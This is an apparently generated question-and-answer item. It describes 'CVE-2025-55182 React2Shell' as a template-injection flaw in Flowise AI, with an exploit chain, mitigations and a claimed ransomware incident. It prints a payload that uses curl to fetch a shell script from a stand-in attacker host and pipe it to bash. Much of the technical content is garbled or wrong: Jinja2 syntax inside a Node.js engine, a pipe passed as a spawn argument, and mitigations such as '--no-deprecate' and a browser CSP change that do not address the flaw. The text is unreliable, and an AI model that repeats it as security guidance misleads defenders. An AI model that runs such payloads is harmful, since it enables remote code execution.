question: Analyze the CVE‑2025-55182 "React2Shell" vulnerability: mechanisms, proof-of-concept chaos, and defensive strategies for securing JavaScript-based LLM orchestration platforms.
answer:
CVE-2025-55182 is a server-side template injection (SSTI) variant deep in the React-to-shell binding layer of Flowise AI, an open-source visual LLM building platform. The flaw arises from unsanitized template expressions that reach the Node.js child_process.spawn API when a builder constructs a “custom component” using the {{command}} Jinja2 placeholder inside a prompt or memory buffer. An attacker can craft a payload such as `{{ (require('child_process')).spawnSync('curl', ['http://attacker.com/shell.sh','|','bash']) }}` that bypasses the sandboxed eval wrapper because Flowise still resolves require() during dynamic template compilation. The PoC titled “chaos.js” published on GitHub uses a one-click exploit chain: (1) POST to /api/v1/predict with a carefully URL-encoded polyglot (UTF-7 + CRLF) in a flow input field; (2) the Flowise expression engine deserializes the payload before an upstream sanitizer executes, creating a root shell on the hosting container; (3) privilege escalation pivots to the host via CAP_SYS_ADMIN token bypass in the default Docker socket mount.

Mitigation requires layered hardening. First, disable dynamic require() resolution by setting `NODE_OPTIONS=--no-deprecate` and patch the flowise-engine npm package to use vm2 in “sandbox” mode with strict Contextify disabled. Second, enable Content-Security-Policy headers with `script-src 'unsafe-inline'` removed and deploy a Lua WAF rule in nginx that blocks any template tag followed by a dot or closing parenthesis. Finally, rotate secrets for the Redis message queue and enforce read-only filesystem mounts with `--read-only --tmpfs /tmp` to contain post-exploitation lateral movement.

Real-world parallels already occurred in July 2025 when UNC2447 chained CVE-2025-55182 against a Fortune 500 AI chatbot, dropping the “yanluowang” ransomware payload via a malicious prompt injection that exfiltrated 23 GB of customer logs to Mega.nz before encrypting the MongoDB cluster.
